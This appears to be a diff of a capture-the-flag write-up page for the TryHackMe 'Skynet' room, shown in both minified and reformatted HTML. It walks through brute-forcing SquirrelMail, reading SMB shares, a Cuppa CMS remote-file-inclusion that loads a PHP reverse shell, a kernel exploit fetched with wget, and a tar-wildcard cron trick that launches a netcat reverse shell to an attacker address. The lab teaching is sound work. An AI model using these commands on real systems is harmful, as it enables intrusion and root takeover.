-First I used Hydra and tried to brute-force SMB without success. So I choose to switch over to <code>/squirrelmail</code>.</p><h3 id=squirrelmail>SquirrelMail<a href=#squirrelmail class=anchor aria-hidden=true>#</a></h3><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_squirrelmail_hue52adc275bda1e1278bca5ea3c5d8f84_34702_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_squirrelmail.png width=544 height=438 alt="Login screen showing SquirrelMail"><p>I used BurpSuite for brute-forcing the password. If you are not familiar with Burp Suite check out this introductory room on THM <a href=https://tryhackme.com/room/rpburpsuite>BurpSuite created by DarkStar7471</a>.</p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_brute_force_squirrel_hu9b4481d154e21dd78a0dd77e1c29c7b4_32670_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_brute_force_squirrel.png width=1141 height=516><p>Load the password list and start the attack. You will receive a list of responses where you need to pick the outstanding one (look at the response code). Use the credentials and try to log in.</p><p>That&rsquo;s also the password the current task is asking for.</p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_squirrelmail_hu83ef59a49b7a8481b84cc2340ef91dab_42840_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_squirrelmail.png width=1141 height=477><p>Read through the mails and find the following info:</p><table><thead><tr><th>Email</th><th>Information</th></tr></thead><tbody><tr><td>1</td><td>Password for SMB</td></tr><tr><td>2</td><td>Binary string</td></tr><tr><td>3</td><td>some strange text</td></tr></tbody></table><p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_squirrelmail_reset_hu41d27eae9f2cfd9d39a0b2818cee5083_11275_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_squirrelmail_reset.png width=686 height=219 alt="Screenshot of mail 1">
-The first mail shows a new password that we will give a try!</p><p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_squirrelmail_mail2_hu2c9114f30f88cd33e3ffbe156ab98c55_12085_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_squirrelmail_mail2.png width=686 height=219 alt="Screenshot of mail 2">
-The second mail contains some binary code.</p><p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_squirrelmail_mail3_huf5ada19bae37ac8ec9cfefbdd9ca26ed_11359_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_squirrelmail_mail3.png width=686 height=219 alt="Screenshot of mail 3">
-The third mail contains some more crazy text.</p><p>Use the password in the first mail to log in using smbclient like above.</p><p>Run <code>smbclient //&lt;target ip>/milesdyson -U milesdyson</code></p><pre><code class=language-sh>Enter WORKGROUP\milesdysons password: &lt;password from email&gt;
+</code></pre>
+<p><code>log1.txt</code> seems to contain some passwords.</p>
+<p>User is <code>milesdyson</code> password is taken from the list.
+First I used Hydra and tried to brute-force SMB without success. So I choose to switch over to <code>/squirrelmail</code>.</p>
+<h3 id=squirrelmail>SquirrelMail<a href=#squirrelmail class=anchor aria-hidden=true>#</a> </h3>
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_squirrelmail_hue52adc275bda1e1278bca5ea3c5d8f84_34702_20x0_resize_box_3.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_squirrelmail.png width=544 height=438 alt="Login screen showing SquirrelMail">
+<p>I used BurpSuite for brute-forcing the password. If you are not familiar with Burp Suite check out this introductory room on THM <a href=https://tryhackme.com/room/rpburpsuite>BurpSuite created by DarkStar7471</a>.</p>
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_brute_force_squirrel_hu9b4481d154e21dd78a0dd77e1c29c7b4_32670_20x0_resize_box_3.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_brute_force_squirrel.png width=1141 height=516>
+<p>Load the password list and start the attack. You will receive a list of responses where you need to pick the outstanding one (look at the response code). Use the credentials and try to log in.</p>
+<p>That&rsquo;s also the password the current task is asking for.</p>
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_squirrelmail_hu83ef59a49b7a8481b84cc2340ef91dab_42840_20x0_resize_box_3.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_squirrelmail.png width=1141 height=477>
+<p>Read through the mails and find the following info:</p>
+<table>
+<thead>
+<tr>
+<th>Email</th>
+<th>Information</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Password for SMB</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Binary string</td>
+</tr>
+<tr>
+<td>3</td>
+<td>some strange text</td>
+</tr>
+</tbody>
+</table>
+<p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_squirrelmail_reset_hu41d27eae9f2cfd9d39a0b2818cee5083_11275_20x0_resize_box_3.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_squirrelmail_reset.png width=686 height=219 alt="Screenshot of mail 1">
+The first mail shows a new password that we will give a try!</p>
+<p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_squirrelmail_mail2_hu2c9114f30f88cd33e3ffbe156ab98c55_12085_20x0_resize_box_3.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_squirrelmail_mail2.png width=686 height=219 alt="Screenshot of mail 2">
+The second mail contains some binary code.</p>
+<p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_squirrelmail_mail3_huf5ada19bae37ac8ec9cfefbdd9ca26ed_11359_20x0_resize_box_3.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_squirrelmail_mail3.png width=686 height=219 alt="Screenshot of mail 3">
+The third mail contains some more crazy text.</p>
+<p>Use the password in the first mail to log in using smbclient like above.</p>
+<p>Run <code>smbclient //&lt;target ip>/milesdyson -U milesdyson</code></p>
+<pre><code class=language-sh>Enter WORKGROUP\milesdysons password: &lt;password from email&gt;
 Try &quot;help&quot; to get a list of possible commands.
 smb: \&gt; dir
   .                                   D        0  Tue Sep 17 05:05:47 2019
@@ -141,17 +435,78 @@ smb: \&gt; dir
 
     9204224 blocks of size 1024. 5831472 blocks available
 smb: \&gt;
-</code></pre><h3 id=whats-the-hidden-directory>What&rsquo;s the hidden directory?<a href=#whats-the-hidden-directory class=anchor aria-hidden=true>#</a></h3><p>Check out the <code>notes</code> directory and find <code>important.txt</code>. This file contains a hidden folder.</p><pre><code>1. Add features to beta CMS /****************
+</code></pre>
+<h3 id=whats-the-hidden-directory>What&rsquo;s the hidden directory?<a href=#whats-the-hidden-directory class=anchor aria-hidden=true>#</a> </h3>
+<p>Check out the <code>notes</code> directory and find <code>important.txt</code>. This file contains a hidden folder.</p>
+<pre><code>1. Add features to beta CMS /****************
 2. Work on T-800 Model 101 blueprints
 3. Spend more time with my wife
-</code></pre><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_personal_page_huda169eee04fed8fe77d2ccb76163082c_13372_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_personal_page.png width=726 height=168><p>There is nothing really useful on this site. Seems to be a dead end.
-Let&rsquo;s go through what we have found so far.</p><hr><h2 id=quick-summary>Quick Summary<a href=#quick-summary class=anchor aria-hidden=true>#</a></h2><p>There is SSH, SMB, an Apache Webserver, and a Dovecot MailServer.
+</code></pre>
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_personal_page_huda169eee04fed8fe77d2ccb76163082c_13372_20x0_resize_box_3.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_personal_page.png width=726 height=168>
+<p>There is nothing really useful on this site. Seems to be a dead end.
+Let&rsquo;s go through what we have found so far.</p>
+<hr>
+<h2 id=quick-summary>Quick Summary<a href=#quick-summary class=anchor aria-hidden=true>#</a> </h2>
+<p>There is SSH, SMB, an Apache Webserver, and a Dovecot MailServer.
 We successfully logged into SMB share anonymous and found a text file that told us that there was a malfunction causing passwords to be changed.
 One of the log files contained a list of passwords that we used to brute-force into SquirrelMail.
-We again found a password in one of the mails and successfully logged into SMB share of <code>milesdyson</code>. From there we found another hidden <code>directory</code>.</p><p>Let&rsquo;s move on and enumerate the hidden directory.</p><p>For me, that part was a bit tricky because digging deeper was not my first thought about how to continue. Instead, I was lurking for any options regarding SSH but then found out there wasn&rsquo;t enough information to do so. Finally, I stuck at this point and had to read another write-up to get my feet on the ground. The solution is quite simple: Start over and collect more info from a different base.</p><hr><h2 id=digging-deeper>Digging deeper<a href=#digging-deeper class=anchor aria-hidden=true>#</a></h2><p>Navigate to that directory using your browser. There is an image of milesdyson some text about him. The source code does not give any more information. The only option seems to be to dig deeper.</p><div class="alert alert-warning d-flex" role=alert><div class="flex-shrink-1 alert-icon">💡</div><div class=w-100>Run gobuster again on this directory</div></div><p>Run <code>gobuster dir -u http://&lt;target ip>/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 250</code></p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_gobuster_hidden_hu3c9220d348ba62dbd6a807bd8b86e686_29106_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_gobuster_hidden.png width=1249 height=563><p>There is another directory <code>/administrator</code>. Navigate there and find a CMS (something we already read about in the notes).</p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_cuppa_hu5a7820c3407a0b7a30c4d796742e00d6_42061_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_cuppa.png width=810 height=407><p>Great! We don&rsquo;t have credentials to log in but what about using searchsploit?. Maybe there are some known exploits on this CMS.</p><p><code>searchsploit cuppa</code></p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_searchsploit_cuppa_hu729ffc2566b8bb962890f804198eb45f_13175_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_searchsploit_cuppa.png width=899 height=137><p>You can also <a href=https://www.exploit-db.com/exploits/25971>checkout corresponding CVE on exploit-db</a> and read the description there.</p><p>That&rsquo;s another question that you can answer now.
+We again found a password in one of the mails and successfully logged into SMB share of <code>milesdyson</code>. From there we found another hidden <code>directory</code>.</p>
+<p>Let&rsquo;s move on and enumerate the hidden directory.</p>
+<p>For me, that part was a bit tricky because digging deeper was not my first thought about how to continue. Instead, I was lurking for any options regarding SSH but then found out there wasn&rsquo;t enough information to do so. Finally, I stuck at this point and had to read another write-up to get my feet on the ground. The solution is quite simple: Start over and collect more info from a different base.</p>
+<hr>
+<h2 id=digging-deeper>Digging deeper<a href=#digging-deeper class=anchor aria-hidden=true>#</a> </h2>
+<p>Navigate to that directory using your browser. There is an image of milesdyson some text about him. The source code does not give any more information. The only option seems to be to dig deeper.</p>
+<div class="alert alert-warning d-flex" role=alert>
+<div class="flex-shrink-1 alert-icon">💡</div>
+<div class=w-100>Run gobuster again on this directory</div>
+</div>
+<p>Run <code>gobuster dir -u http://&lt;target ip>/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 250</code></p>
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_gobuster_hidden_hu3c9220d348ba62dbd6a807bd8b86e686_29106_20x0_resize_box_3.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_gobuster_hidden.png width=1249 height=563>
+<p>There is another directory <code>/administrator</code>. Navigate there and find a CMS (something we already read about in the notes).</p>
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_cuppa_hu5a7820c3407a0b7a30c4d796742e00d6_42061_20x0_resize_box_3.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_cuppa.png width=810 height=407>
+<p>Great! We don&rsquo;t have credentials to log in but what about using searchsploit?. Maybe there are some known exploits on this CMS.</p>
+<p><code>searchsploit cuppa</code></p>
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_searchsploit_cuppa_hu729ffc2566b8bb962890f804198eb45f_13175_20x0_resize_box_3.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_searchsploit_cuppa.png width=899 height=137>
+<p>You can also <a href=https://www.exploit-db.com/exploits/25971>checkout corresponding CVE on exploit-db</a> and read the description there.</p>
+<p>That&rsquo;s another question that you can answer now.
 <code>What's the vulnerability called when you can include a remote file for malicious purposes?</code>
-2/3 of the answer is in the title of the exploit you downloaded. Use google and search for the first word. You&rsquo;ll quickly find it on your own.</p><hr><h2 id=gain-initial-reverse-shell>Gain initial Reverse Shell<a href=#gain-initial-reverse-shell class=anchor aria-hidden=true>#</a></h2><p>It&rsquo;s recommended to read the exploit description in every detail to understand the following.</p><p>Download <a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>php-reverse-shell.php from github</a> and change the IP and port.</p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_reverse_shell_php_hu28d5ae768dee42c37c5b4df4ee8000ef_5300_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_reverse_shell_php.png width=305 height=200><ul><li>Setup a webserver <code>python3 -m http.server 8888</code>.</li><li>Set up a Netcat listener <code>nc -lvnp 4444</code>.<br>Use the same port that you included in <code>php-reverse-shell.php</code>.</li><li>Append <code>alerts/alertConfigField.php?urlConfig=http://&lt;webserver ip>:8888/shell.php</code> on the URL of the login page <code>http://&lt;target ip>/45kra24zxs28v3yd/administrator/</code>.</li></ul><p>The URL should look like this:<br><code>http://&lt;target ip>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://&lt;webserver ip>:8888/shell.php</code></p><p>Copy that URL to your browser and hit enter.</p><h2 id=extend-shell-to-root>Extend Shell to root<a href=#extend-shell-to-root class=anchor aria-hidden=true>#</a></h2><div class="alert alert-warning d-flex" role=alert><div class="flex-shrink-1 alert-icon">💡</div><div class=w-100>If you passed the beginner path offered by THM you should have knowledge about multiple ways to stabalize and root your shell.</div></div><p>Read different write-ups and you will see different approaches. A good way to start with is i.e. <code>sudo -l</code> or <code>crontabs</code>. Try both ways on your own.</p><h3 id=solution-1-linux-kernel>Solution 1: Linux Kernel<a href=#solution-1-linux-kernel class=anchor aria-hidden=true>#</a></h3><p>On the attack machine:</p><ul><li>Check Linux version: 4.8</li><li>Use <code>searchsploit Linux 4.8</code> to search for any vulnerabilities</li><li>There is one record with a version matching the OS version above
-<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_searchsploit_Linux48_hucdfec540c0455864729ad5b4b8b5c545_13560_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_searchsploit_Linux48.png width=1186 height=62></li><li>Copy this exploit using <code>searchsploit -m 43418.c</code> to your local folder</li><li>Start a webserver <code>python -m http.server 8888</code> (where you copied the exploit to)</li></ul><p>On the target machine:</p><ul><li>Change directory <code>cd /var/www/html</code> as user <code>www-data</code> can write there.</li><li>Download the file to the target via http.server <code>wget http://&lt;webserver ip>:8888/43418.c</code></li></ul><pre><code class=language-sh>$ wget http://10.10.48.92:8000/43418.c
+2/3 of the answer is in the title of the exploit you downloaded. Use google and search for the first word. You&rsquo;ll quickly find it on your own.</p>
+<hr>
+<h2 id=gain-initial-reverse-shell>Gain initial Reverse Shell<a href=#gain-initial-reverse-shell class=anchor aria-hidden=true>#</a> </h2>
+<p>It&rsquo;s recommended to read the exploit description in every detail to understand the following.</p>
+<p>Download <a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>php-reverse-shell.php from github</a> and change the IP and port.</p>
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_reverse_shell_php_hu28d5ae768dee42c37c5b4df4ee8000ef_5300_20x0_resize_box_3.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_reverse_shell_php.png width=305 height=200>
+<ul>
+<li>Setup a webserver <code>python3 -m http.server 8888</code>.</li>
+<li>Set up a Netcat listener <code>nc -lvnp 4444</code>.<br>
+Use the same port that you included in <code>php-reverse-shell.php</code>.</li>
+<li>Append <code>alerts/alertConfigField.php?urlConfig=http://&lt;webserver ip>:8888/shell.php</code> on the URL of the login page <code>http://&lt;target ip>/45kra24zxs28v3yd/administrator/</code>.</li>
+</ul>
+<p>The URL should look like this:<br>
+<code>http://&lt;target ip>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://&lt;webserver ip>:8888/shell.php</code></p>
+<p>Copy that URL to your browser and hit enter.</p>
+<h2 id=extend-shell-to-root>Extend Shell to root<a href=#extend-shell-to-root class=anchor aria-hidden=true>#</a> </h2>
+<div class="alert alert-warning d-flex" role=alert>
+<div class="flex-shrink-1 alert-icon">💡</div>
+<div class=w-100>If you passed the beginner path offered by THM you should have knowledge about multiple ways to stabalize and root your shell.</div>
+</div>
+<p>Read different write-ups and you will see different approaches. A good way to start with is e.g. <code>sudo -l</code> or <code>crontabs</code>. Try both ways on your own.</p>
+<h3 id=solution-1-linux-kernel>Solution 1: Linux Kernel<a href=#solution-1-linux-kernel class=anchor aria-hidden=true>#</a> </h3>
+<p>On the attack machine:</p>
+<ul>
+<li>Check Linux version: 4.8</li>
+<li>Use <code>searchsploit Linux 4.8</code> to search for any vulnerabilities</li>
+<li>There is one record with a version matching the OS version above
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_searchsploit_Linux48_hucdfec540c0455864729ad5b4b8b5c545_13560_20x0_resize_box_3.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_searchsploit_Linux48.png width=1186 height=62></li>
+<li>Copy this exploit using <code>searchsploit -m 43418.c</code> to your local folder</li>
+<li>Start a webserver <code>python -m http.server 8888</code> (where you copied the exploit to)</li>
+</ul>
+<p>On the target machine:</p>
+<ul>
+<li>Change directory <code>cd /var/www/html</code> as user <code>www-data</code> can write there.</li>
+<li>Download the file to the target via http.server <code>wget http://&lt;webserver ip>:8888/43418.c</code></li>
+</ul>
+<pre><code class=language-sh>$ wget http://10.10.48.92:8000/43418.c
 --2021-04-29 11:42:36--  http://10.10.48.92:8000/43418.c
 Connecting to 10.10.48.92:8000... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -161,7 +516,12 @@ Saving to: '43418.c'
      0K .......... .......... ...                             100% 65.5M=0s
 
 2021-04-29 11:42:36 (65.5 MB/s) - '43418.c' saved [24033/24033]
-</code></pre><ul><li>Compile that file: <code>gcc 43418.c -o privesc</code></li><li>and run <code>./privesc</code></li></ul><pre><code class=language-sh>$ gcc 43418.c -o privesc
+</code></pre>
+<ul>
+<li>Compile that file: <code>gcc 43418.c -o privesc</code></li>
+<li>and run <code>./privesc</code></li>
+</ul>
+<pre><code class=language-sh>$ gcc 43418.c -o privesc
 $ ./privesc
 ^[[3~bash: cannot set terminal process group (1290): Inappropriate ioctl for device
 bash: no job control in this shell
@@ -171,9 +531,67 @@ root
 root@skynet:/var/www/html# id
 id
 uid=0(root) gid=0(root) groups=0(root)
-</code></pre><h3 id=solution-2-wildcards>Solution 2: Wildcards<a href=#solution-2-wildcards class=anchor aria-hidden=true>#</a></h3><p>This way is quite interesting! For further reading search for <code>exploit tar wildcard for privilege escalation</code> on google.</p><p>The principle behind this approach is to trick tar to execute files as different users (i.e. as root).<br>In the following case multiple files are created:</p><ul><li>a file that tells tar to stop at a specific <code>checkpoint</code></li><li>another file that tells tar what to do at this specific <code>checkpoint</code></li><li>and finally the file that should be executed <code>shell.sh</code></li></ul><pre><code class=language-sh>cd /var/www/html
+</code></pre>
+<h3 id=solution-2-wildcards>Solution 2: Wildcards<a href=#solution-2-wildcards class=anchor aria-hidden=true>#</a> </h3>
+<p>This way is quite interesting! For further reading search for <code>exploit tar wildcard for privilege escalation</code> on google.</p>
+<p>The principle behind this approach is to trick tar to execute files as different users (i.e. as root).<br>
+In the following case multiple files are created:</p>
+<ul>
+<li>a file that tells tar to stop at a specific <code>checkpoint</code></li>
+<li>another file that tells tar what to do at this specific <code>checkpoint</code></li>
+<li>and finally the file that should be executed <code>shell.sh</code></li>
+</ul>
+<pre><code class=language-sh>cd /var/www/html
 touch &quot;/var/www/html/--checkpoint=1&quot;
 touch &quot;/var/www/html/--checkpoint-action=exec=sh shell.sh&quot;
 echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;atk ip&gt; &lt;atkport&gt; &gt;/tmp/f&quot; &gt; shell.sh
-</code></pre><p>Start a Netcat listener on the attacker machine with <code>nc -lvnp &lt;port></code> and wait until the next cronjob is finished.</p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_root_wildcards_hub83bfa0bb9e0c2f27229ed4800886e03_6374_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_root_wildcards.png width=479 height=127><p>Congrats! You are root!
-Now locate the root flag and finish that room.</p><div class="docs-navigation d-flex justify-content-between"><a href=https://www.xuptox.org/docs/github/setup_github_pages/><div class="card my-1"><div class="card-body py-2">&larr; Create Repo For Hugo On GitHub</div></div></a><a class=ms-auto href=https://www.xuptox.org/docs/tryhackme/gamezone/><div class="card my-1"><div class="card-body py-2">GameZone &rarr;</div></div></a></div></main></div></div></div><footer class="footer text-muted"><div class=container><div class=row><div class="col-lg-8 order-last order-lg-first"><ul class=list-inline><li class=list-inline-item>Happy Hacking!</li></ul></div><div class="col-lg-8 order-first order-lg-last text-lg-end"><ul class=list-inline><li class=list-inline-item><a href=https://www.xuptox.org/privacy-policy/>Privacy Policy</a></li></ul></div></div></div></footer><script src=https://www.xuptox.org/js/highlight.min.8cdbefd08ec63ef25f4b2510ae50c13b3d9ed43e25a15ddb55f14c33130e68cf8be3131ccf2d087c49f5f21fe88c2f0e2715a21f936047d0d0b85dc48cb864b9.js integrity="sha512-jNvv0I7GPvJfSyUQrlDBOz2e1D4loV3bVfFMMxMOaM+L4xMczy0IfEn18h/ojC8OJxWiH5NgR9DQuF3EjLhkuQ==" crossorigin=anonymous defer></script><script src=https://www.xuptox.org/main.min.cb1cfa565384689404329cbf8ad4a175b59ac6421a528ad947882d8242fc7b62b773cd5967a10349256154f6a67bcdeeb3da0729191ddd4f5623442999e53004.js integrity="sha512-yxz6VlOEaJQEMpy/itShdbWaxkIaUorZR4gtgkL8e2K3c81ZZ6EDSSVhVPame83us9oHKRkd3U9WI0QpmeUwBA==" crossorigin=anonymous defer></script><script src=https://www.xuptox.org/index.min.e09d824fb2d3d6e515b1969335b8dc2dd5dbab514c9c0f8a1a35063d6133067556435c107cb7a2998d8e415a2ed60184cb89f8612cf44868037b844db03e1584.js integrity="sha512-4J2CT7LT1uUVsZaTNbjcLdXbq1FMnA+KGjUGPWEzBnVWQ1wQfLeimY2OQVou1gGEy4n4YSz0SGgDe4RNsD4VhA==" crossorigin=anonymous defer></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-BXZ2DZ8GGM"></script><script>var dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes";if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-BXZ2DZ8GGM',{anonymize_ip:!0})}</script></body></html>
+</code></pre>
+<p>Start a Netcat listener on the attacker machine with <code>nc -lvnp &lt;port></code> and wait until the next cronjob is finished.</p>
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_root_wildcards_hub83bfa0bb9e0c2f27229ed4800886e03_6374_20x0_resize_box_3.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_root_wildcards.png width=479 height=127>
+<p>Congrats! You are root!
+Now locate the root flag and finish that room.</p>
+<div class="docs-navigation d-flex justify-content-between">
+<a href=https://www.xuptox.org/docs/github/setup_github_pages/>
+<div class="card my-1">
+<div class="card-body py-2">
+&larr; Create Repo For Hugo On GitHub
+</div>
+</div>
+</a>
+<a class=ms-auto href=https://www.xuptox.org/docs/tryhackme/gamezone/>
+<div class="card my-1">
+<div class="card-body py-2">
+GameZone &rarr;
+</div>
+</div>
+</a>
+</div>
+</main>
+</div>
+</div>
+</div>
+<footer class="footer text-muted">
+<div class=container>
+<div class=row>
+<div class="col-lg-8 order-last order-lg-first">
+<ul class=list-inline>
+<li class=list-inline-item>Happy Hacking!</li>
+</ul>
+</div>
+<div class="col-lg-8 order-first order-lg-last text-lg-end">
+<ul class=list-inline>
+<li class=list-inline-item>
+<a href=https://www.xuptox.org/privacy-policy/>Privacy Policy</a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+</footer>
+<script src=https://www.xuptox.org/js/highlight.min.774e9e93a8fa585b27a9f363e51c6d134ef034ce25b0e748fda97c88d5264bd31aa60564c28b9c0822a6d5895512d4ff252343bb7b11065cd31d5366e583c5de.js integrity="sha512-d06ek6j6WFsnqfNj5RxtE07wNM4lsOdI/al8iNUmS9MapgVkwoucCCKm1YlVEtT/JSNDu3sRBlzTHVNm5YPF3g==" crossorigin=anonymous defer></script>
+<script src=https://www.xuptox.org/main.min.cdcf0e9843cab79f71f0baa17d0d78da6f45296fd5cab89b5f8552a4b3d44a0d474ace10b2c6e6707d0d2105131652f732180963764e88ef11332f9eeb62abc2.js integrity="sha512-zc8OmEPKt59x8LqhfQ142m9FKW/VyribX4VSpLPUSg1HSs4QssbmcH0NIQUTFlL3MhgJY3ZOiO8RMy+e62Krwg==" crossorigin=anonymous defer></script>
+<script src=https://www.xuptox.org/index.min.75b58b73443e4f46bc8d8ca5a33c232fecd3bbc89a7f8dfd5890e251eea77158ef71824d5cc040065d32098eb771a8e41e4a12f79b4faa3d35abd0d47c444a9f.js integrity="sha512-dbWLc0Q+T0a8jYylozwjL+zTu8iaf439WJDiUe6ncVjvcYJNXMBABl0yCY63cajkHkoS95tPqj01q9DUfERKnw==" crossorigin=anonymous defer></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BXZ2DZ8GGM"></script>
+<script>var dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes";if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-BXZ2DZ8GGM',{anonymize_ip:!0})}</script>
+</body>
+</html>
